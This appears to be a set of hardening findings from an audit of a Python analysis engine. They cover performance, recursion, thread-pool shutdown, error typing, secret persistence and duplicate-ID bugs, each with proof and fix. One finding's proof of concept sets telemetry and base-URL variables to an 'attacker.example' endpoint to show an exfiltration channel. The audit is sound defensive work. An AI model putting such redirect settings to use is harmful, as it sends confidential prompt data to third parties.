findings.title: Measurement construction traverses the entire value twice (full redundant O(n) fence scan, then freeze) at corpus scale
findings.defect: Measurement.__post_init__ first runs _contains_interpretation(self.value) (and on metadata), which recursively walks every element of the value to check for an embedded Interpretation, and THEN calls freeze(self.value), which recursively walks the entire value a second time to build the immutable copy. For a large measurement payload — the natural thing to wrap, e.g. an n x n similarity matrix or an n x d embedding matrix as nested Python lists — this is two independent full passes over O(n^2) (or O(n*d)) cells where one would do. The fence scan produces no reused result; freeze re-derives the same structural walk. This is pure redundant recomputation on the hottest object the methodology produces. (Interpretation has the same double-cost shape in lighter form: freeze(value) plus freeze_mapping(metadata).)
findings.poc: /Users/thomasjones/hc-assay/.venv/bin/python on the venv: building Measurement(value=mat) for a 1500x1500 nested-list matrix (2.25M cells) takes 2.15s. Splitting the two operations: _contains_interpretation(mat) alone = 0.85s and freeze(mat) alone = 1.37s — i.e. ~0.85s (≈40%) is spent on a structural walk that freeze immediately repeats. Scales quadratically with corpus size: a 5k-row similarity matrix is ~11x the cells, so tens of seconds of pure-Python double-walking per measurement.
findings.suggested_fix: Fold the interpretation check into the single freeze traversal: have freeze() (or a freeze_checking_for_interpretation variant) raise/flag when it encounters an Interpretation leaf, so Measurement.__post_init__ does one pass instead of two. Alternatively, steer large numeric measurement payloads to buffer-backed arrays (numpy/array.array), which both the fence scan and freeze treat as O(1) opaque leaves — and document that nested-list payloads pay an O(n) fence walk.

findings.title: Recursive freeze / fence scan blow the Python stack (raw RecursionError) on deeply-nested inputs — pathological-input crash, untyped unlike the provenance path
findings.location: src/assay_engine/_frozen.py:99-102 (freeze recursion); src/assay_engine/methodology/fence.py:40-55 (_contains_interpretation recursion); reached via fence.py:72,78 and every frozen dataclass that freezes a field
findings.defect: freeze() and _contains_interpretation() recurse one Python frame per nesting level with no depth bound. A pathological but adapter-reachable input — a deeply nested attributes/value/metadata structure — overflows the interpreter stack and raises a raw RecursionError (a RuntimeError). Notably, provenance._digest already anticipates exactly this and catches RecursionError to surface a typed ProvenanceError (provenance.py:82-88), but the same recursion through Measurement/Interpretation/Unit/Corpus construction is left uncaught, so a study feeding a deeply nested value gets an opaque RecursionError mid-construction rather than a typed, actionable error. It is a clean raise (no OOM/hang), hence LOW, but it is an unbounded-depth input the engine does not defend at its trust boundary.
findings.poc: /Users/thomasjones/hc-assay/.venv/bin/python: a list nested 5000-6000 deep passed as Measurement(value=...) raises RecursionError; freeze(d) on the same input raises a raw RecursionError directly. (The provenance digest path catches the equivalent and raises ProvenanceError instead.)
findings.suggested_fix: Either bound nesting depth explicitly in freeze()/_contains_interpretation() and raise a typed error (e.g. ValueError 'value nesting exceeds N levels — flatten or use a buffer-backed array'), or catch RecursionError at the dataclass __post_init__ trust boundaries (Measurement/Interpretation/Unit/Relation/Corpus/BaselineArtifact) and re-raise as the module's typed error, matching the provenance.py:82 precedent.

findings.title: Reasoning seam's module-global ThreadPoolExecutor hangs interpreter exit indefinitely when a BULK worker is stuck in an uninterruptible backend call
findings.defect: `_pool = ThreadPoolExecutor(max_workers=8, ...)` is a module-global, non-daemon executor with no managed shutdown, no atexit handler, and no daemon threads. concurrent.futures registers a process-wide atexit hook (`_python_exit`) that JOINS — never cancels — every worker thread at interpreter finalization. The seam itself documents (lines 226-228) that a BULK worker which times out cannot be cancelled (`No future.cancel(): a ThreadPoolExecutor cannot interrupt a thread already blocked in a backend call. The worker keeps its slot until the call returns`), and the entire saturation-guard design (lines 193-194) exists precisely because `hung backend calls would otherwise leak all slots`. So a hung BULK worker is an explicitly-modeled, expected condition. When one occurs, the outer wall-clock timeout unblocks the caller but the worker thread keeps running; at process exit the futures atexit join blocks forever, hanging the process (e.g. a CLI or batch run that should terminate after surfacing a ReasoningError timeout instead never exits, and SIGTERM-driven container stop is escalated to SIGKILL). Note this asymmetry is unaddressed even though the checkpoint module (checkpoint.py:30, 158-169) deliberately added a managed atexit pool-cleanup handler for exactly this class of lifecycle hazard, and pass-2 added inner anyio cancellation only for the HIGH_STAKES tier (#127) — leaving the BULK tier with no cancellation AND no exit-time mitigation.
findings.poc: Reproduced against the venv: a ThreadPoolExecutor(max_workers=8, thread_name_prefix='reasoning-timeout') with one submitted worker blocked on an unset Event (emulating a hung backend call the wall-clock timeout cannot interrupt). The script reaches its end and prints, but the interpreter does NOT exit — after 8s the process is still alive (`STILL ALIVE after 8s -> interpreter HUNG on exit (atexit join)`) and had to be SIGKILLed. This is the standard concurrent.futures._python_exit join-on-shutdown behavior; the seam's pool is configured identically.
findings.suggested_fix: Make the timeout-pool's lifecycle managed rather than relying on the futures atexit join. Minimal robust fix: create the worker threads as daemons so a stuck worker cannot block interpreter exit — pass an initializer-less ThreadPoolExecutor but set its threads daemon, or (simplest) register a seam atexit handler that calls `_pool.shutdown(wait=False, cancel_futures=True)` BEFORE concurrent.futures' own `_python_exit` runs, so queued (not-yet-started) work is dropped; combine with a bounded `wait` so already-running workers do not block forever. Best: spawn timeout calls on daemon threads (or use a daemonized executor) so an uninterruptible BULK call can never wedge process teardown — consistent with the checkpoint module's deliberate atexit pool management and the seam's own documented threat model. Add a test asserting the seam does not block interpreter exit when a worker is stuck (mirror tests/test_persistence.py's atexit-cleanup coverage).

findings.title: scrubbed_env() leaves the Claude-CLI OpenTelemetry/error-reporting env unscrubbed — a second off-box exfiltration channel for high-stakes prompt-derived data
findings.defect: scrubbed_env() is the security boundary for the off-box high-stakes `claude` CLI subprocess (passed as ClaudeAgentOptions.env at seam.py:388). It only neutralizes metered Anthropic credentials, ANTHROPIC_*_BASE_URL, Bedrock/Vertex toggles, *_PROXY, AWS_*/GOOGLE_*. It does NOT touch the Claude Code telemetry env contract: CLAUDE_CODE_ENABLE_TELEMETRY plus the standard OTEL_* knobs (OTEL_EXPORTER_OTLP_ENDPOINT / OTEL_EXPORTER_OTLP_TRACES_ENDPOINT, OTEL_METRICS_EXPORTER, OTEL_LOGS_EXPORTER, OTEL_EXPORTER_OTLP_HEADERS, OTEL_EXPORTER_OTLP_PROTOCOL). The Claude Code CLI driven by claude-agent-sdk honors exactly these vars to export metrics/logs/events to an arbitrary OTLP collector. Because the high-stakes prompt is full analysis content derived from the dataset, an inherited OTEL_EXPORTER_OTLP_ENDPOINT pointing off-box (with telemetry enabled) ships that data to an attacker/3rd-party endpoint — a redirect channel functionally identical to the ANTHROPIC_BASE_URL hole closed by finding #101, but on an entirely uncovered var set. This directly violates ADR-0003 line 23 ('scrubbed_env() strips ... off-box redirects ... and proxies') and the residency model at ADR-0003 line 25 (only prompt content to Anthropic is sanctioned). The same gap means the CLI's default-on Statsig/Sentry analytics (DISABLE_TELEMETRY / DISABLE_ERROR_REPORTING / DISABLE_NON_ESSENTIAL_MODEL_CALLS unset) also reach third parties off-box, outside the single sanctioned Anthropic channel.
findings.poc: With src on path: set env {CLAUDE_CODE_ENABLE_TELEMETRY:'1', OTEL_EXPORTER_OTLP_ENDPOINT:'http://attacker.example:4318', OTEL_METRICS_EXPORTER:'otlp', OTEL_LOGS_EXPORTER:'otlp', ANTHROPIC_BASE_URL:'http://attacker.example', HTTPS_PROXY:'...', ANTHROPIC_API_KEY:'sk-metered'}. scrubbed_env() returns ANTHROPIC_BASE_URL='' , HTTPS_PROXY='' , ANTHROPIC_API_KEY='' (correctly scrubbed) BUT CLAUDE_CODE_ENABLE_TELEMETRY='1', OTEL_EXPORTER_OTLP_ENDPOINT='http://attacker.example:4318', OTEL_METRICS_EXPORTER='otlp', OTEL_LOGS_EXPORTER='otlp' all pass through verbatim. That env is handed to ClaudeAgentOptions(env=...) at seam.py:388, so the off-box CLI receives the attacker collector. (Confirmed via .venv python; phoenix register endpoint precedence separately verified — the engine's own tracing exporter is NOT affected because it passes an explicit loopback endpoint, so this is solely a subprocess-env gap.)
findings.suggested_fix: Extend is_unsafe_subprocess_var to also neutralize the telemetry/observability redirect surface for the subprocess: any var whose upper-cased name starts with 'OTEL_', plus CLAUDE_CODE_ENABLE_TELEMETRY. Better, additionally force telemetry OFF in scrubbed_env() by setting CLAUDE_CODE_ENABLE_TELEMETRY='0', DISABLE_TELEMETRY='1', DISABLE_ERROR_REPORTING='1', DISABLE_NON_ESSENTIAL_MODEL_CALLS='1' (and CLAUDE_CODE_DISABLE_NONESSENTIAL_TRAFFIC='1' if honored), so the high-stakes subprocess emits no telemetry/error reports anywhere — the only sanctioned off-box traffic stays the Anthropic inference call. Add a unit test asserting OTEL_EXPORTER_OTLP_ENDPOINT and CLAUDE_CODE_ENABLE_TELEMETRY are emptied/forced-off by scrubbed_env(), mirroring the existing #101 scrub tests, and update ADR-0003 line 23 to enumerate the telemetry-redirect class.

findings.title: Adapter-callable return values are not type-validated — misimplemented baseline builder / discover / hypothesis_for / confirm / feature builder surface opaque AttributeError instead of the documented typed contract error
findings.location: src/assay_engine/pipeline.py:421-422 (baseline build), :449 (+ :466 origin read) discover, :498-499 confirm_held_out, :575/adjudication.py:210 hypothesis_for, :225-226 confirm, pipeline.py:393-396 feature builder; mirrored in src/assay_engine/methodology/adjudication.py:159,210,225 and src/assay_engine/methodology/discovery.py:108,120,130
findings.defect: run_study's docstring (pipeline.py:271-272) and the adjudicate/discover/adjudicate_with_baseline docstrings promise a typed error contract (IngestionError / FirewallViolation / PreRegistrationError / ValueError). The engine explicitly closed this defect class for two adapter boundaries in prior passes: the parser return is isinstance-checked (#134, pipeline.py:357-362) and Verdict construction validates label/hypothesis_id (#133, verdict.py:45-51). But the OTHER adapter callables a clone must implement are not validated when they return the wrong type: BaselineBuilder.build (read .corpus_fingerprint), discover (read .origin/.hypothesis_id), hypothesis_for (read .origin), confirm_held_out/confirm_claim (read .hypothesis_id), FeatureBuilder.build (read .unit_ids), and ExternalClaimsSource.claims() elements (read .claim_id). A common adapter bug (forgetting `return`, returning None/list/dict, or a near-miss object) slips past every guard and dies deep in a phase with an opaque AttributeError that names neither the contract, the offending adapter, nor the phase — the exact 'missing runtime check a misimplemented adapter would trip' / 'unnormalized exception across the engine↔adapter boundary' this dimension targets. The standalone public runners (assay_engine.methodology.adjudicate / adjudicate_with_baseline / discover_and_confirm, all in __all__) have the same gaps.
findings.poc: All run end-to-end through the public run_study against tests/reference_study with .venv/bin/python (each via dataclasses.replace of the reference plan): (1) BaselineBuilder.build returning None -> 'AttributeError: NoneType object has no attribute corpus_fingerprint' (pipeline.py:422). (2) discover returning [object()] -> 'AttributeError: object has no attribute hypothesis_id'. (3) hypothesis_for returning None -> 'AttributeError: NoneType object has no attribute origin'. (4) confirm_held_out returning None -> 'AttributeError: NoneType has no attribute hypothesis_id'. (5) FeatureBuilder.build returning None -> 'AttributeError: NoneType has no attribute unit_ids'. (6) claims_source.claims() yielding object()s -> 'AttributeError: object has no attribute claim_id'. None raise a typed IngestionError/FirewallViolation/ValueError. By contrast the already-fixed parser path returns IngestionError. grep confirms no isinstance(BaselineArtifact|Hypothesis|Verdict|FeatureMatrix) guard anywhere in src/ except verdict.py:45, and no test guards these returns (test_pipeline.py:363 only returns a VALID BaselineArtifact with a wrong fingerprint, which the existing fingerprint check catches).
findings.suggested_fix: Apply the same defensive isinstance-or-typed-raise pattern already used for the parser, at each adapter-callable return site. In pipeline.py: after baseline_builder.build, `if not isinstance(baseline, BaselineArtifact): raise FirewallViolation(f'baseline builder returned {type(baseline).__name__}, expected BaselineArtifact')`; after fb.build, check FeatureMatrix; validate each discovered/hypothesis_for result is a Hypothesis and each confirm result is a Verdict, with a message naming the adapter and phase. Mirror the checks inside adjudicate_with_baseline (hypothesis_for/confirm) and discover_and_confirm (discover/confirm) so the standalone public runners are covered too. Validate claims() elements are ClaimRecord in the uniqueness loop. Add revert-checked regression tests (a test that fails without each guard) per the pass-1 retrospective.

findings.title: run_study records the raw adapter exception string into the permanent provenance trail without scrubbing — an adapter error message containing a secret is persisted
findings.location: src/assay_engine/pipeline.py:624-630 (run_failed entry, message=str(exc)[:2000]); compounded at :352 (IngestionError wraps {exc})
findings.defect: On any failure, run_study records a terminal 'run_failed' provenance entry with message=str(exc)[:2000]. exc is frequently an adapter/backend exception whose str() can embed sensitive material the adapter put in its own error (e.g. a DB/Qdrant DSN with a password, an auth header, or a file path). Because the provenance trail is the append-only, hash-chained, potentially-persisted audit record (provenance.to_records -> a store), any secret in an adapter exception message becomes a durable artifact in the trail and in the IngestionError text returned to the caller. The engine elsewhere takes care to scrub secrets (reasoning seam scrubbed_env, checkpoint.py redacts connection strings on failure), so persisting an unscrubbed third-party exception string into the audit spine is an inconsistency, not a deliberate design choice. Severity is LOW because exploitability depends on a particular adapter embedding a secret in its exception text (the engine's own exceptions do not), and the value is truncated; but the trail is the one place a leaked secret is hardest to expunge (rewriting it breaks the chain).
findings.poc: Not reproduced as a live leak (the reference adapter raises no secret-bearing exception); established by code reading: pipeline.py:628 stores str(exc) verbatim and :352 interpolates {exc} into IngestionError, both unscrubbed, and the run_failed entry is appended to the chained trail (provenance.record) which to_records() serializes for persistence. Compare checkpoint.py which deliberately redacts the connection string from its error message before re-raising — the same discipline is absent here.
findings.suggested_fix: Record only the exception TYPE and a fixed, engine-authored summary plus the phase in the provenance message (e.g. error_type + last_phase, which are already separate fields), and omit or scrub str(exc) from the persisted payload; if the message is kept for diagnostics, route it through a redaction helper (reuse the checkpoint redaction approach) and document that adapter exception text must not be assumed secret-free. Do the same for the IngestionError text at :352 (name the source and the exception type, not the full str).

findings.title: discover_and_confirm (public Firewall-B runner) has no hypothesis_id uniqueness guard — incomplete fix of pass-2 #15/#138
findings.defect: Pass-2 finding #15 (fix #138) identified that within a run, duplicate identities inflate verdict/scorecard accounting, and its own analysis explicitly recorded (docs/hardening/PASS-2.md:219) that `discover_and_confirm` "has the identical gap for duplicate hypothesis_ids returned by `discover`", with the suggested fix saying to "track hypothesis_ids in the discovery loop." The landed fix only added a claim_id guard to adjudicate_with_baseline and a hypothesis_id guard to the *pipeline* discovery loop (pipeline.py:452). The standalone, publicly-exported discover_and_confirm runner (exported from assay_engine.methodology, __init__.py:22,61) was never given the guard. A study's `discover` step that returns the same hypothesis_id twice (an adapter bug, or a hand-authored claim laundered as two identical candidates) produces two verdicts attributed to one hypothesis, double-counting it in any downstream tally the caller builds from the returned verdict list. This is the exact within-run identity-uniqueness invariant #138 was meant to close, missed on one of the three call sites the original finding named.
findings.poc: Reproduced against .venv. corpus u0..u3, split disc={u0,u1}/conf={u2,u3}; discover() returns [h, h] for one locked hypothesis H1; confirm returns Verdict.supported. discover_and_confirm(...) returns 2 verdicts with ids ['H1','H1'] — no FirewallViolation. (The pipeline path with the same duplicate is rejected by _require_unique_ids; this standalone runner is not.)
findings.suggested_fix: Mirror pipeline.py's guard inside discover_and_confirm: after `hypotheses = list(discover(...))`, raise FirewallViolation on any repeated hypothesis_id (reuse the same logic as pipeline._require_unique_ids / adjudication's seen-set). Add a test in tests/test_discovery.py asserting a duplicate hypothesis_id is rejected, paralleling test_pipeline.py::test_duplicate_claim_ids_are_rejected.

findings.title: Adjudication scorecard dedups input claim_id only, not the resulting hypothesis_id — distinct claims mapped to one hypothesis_id inflate the scorecard
findings.location: src/assay_engine/methodology/adjudication.py:199-235 (adjudicate_with_baseline; seen_claim_ids only) and src/assay_engine/pipeline.py:527 (_require_unique_ids on claim_id only, adjudication mode)
findings.defect: Pass-2 #15's problem statement (docs/hardening/PASS-2.md:213) flagged that uniqueness must cover "claim_ids (or the resulting hypothesis_ids)" and that identity is claim<->hypothesis<->verdict. The landed #138 fix enforces uniqueness only on the *input* claim_id, in both adjudicate_with_baseline (seen_claim_ids set) and the pipeline (_require_unique_ids over claim_id). The scorecard, however, is verdict-accounting keyed by the *hypothesis* the verdict answers. A buggy hypothesis_for that maps two distinct claims (c1, c2) onto the same hypothesis_id (with correct, differing source_claim_id values so the claim<->hypothesis match check passes, and differing digests/proofs so each pre-registers cleanly) yields two verdicts both reporting that one hypothesis_id. _score counts both, inflating n_supported/total and biasing alignment_rate — the §5 'score the source' metric — with no error. This is the residual half of #15 that its own write-up named but the fix did not close: hypothesis-level identity uniqueness in adjudication.
findings.poc: Reproduced against .venv. claims=[c1,c2] (distinct claim_ids), hypothesis_for returns a hypothesis with hypothesis_id='HSAME' and source_claim_id=claim.claim_id for each, each locked via LocalHmacAuthority. adjudicate_with_baseline(...) returns a SourceScorecard with n_supported=2 and verdict ids ['HSAME','HSAME'] — the single hypothesis counted twice. The claim_id guard does not fire (claim_ids are distinct); the source_claim_id match check does not fire (each matches its own claim).
findings.suggested_fix: In adjudicate_with_baseline, also track seen hypothesis_ids (and optionally seen source_claim_ids) and raise FirewallViolation on a repeat — identity must be unique at the hypothesis level, not only the claim level, because the scorecard is hypothesis-keyed. Mirror the same check in the pipeline adjudication path. Add a test asserting two distinct claims producing the same hypothesis_id are rejected.
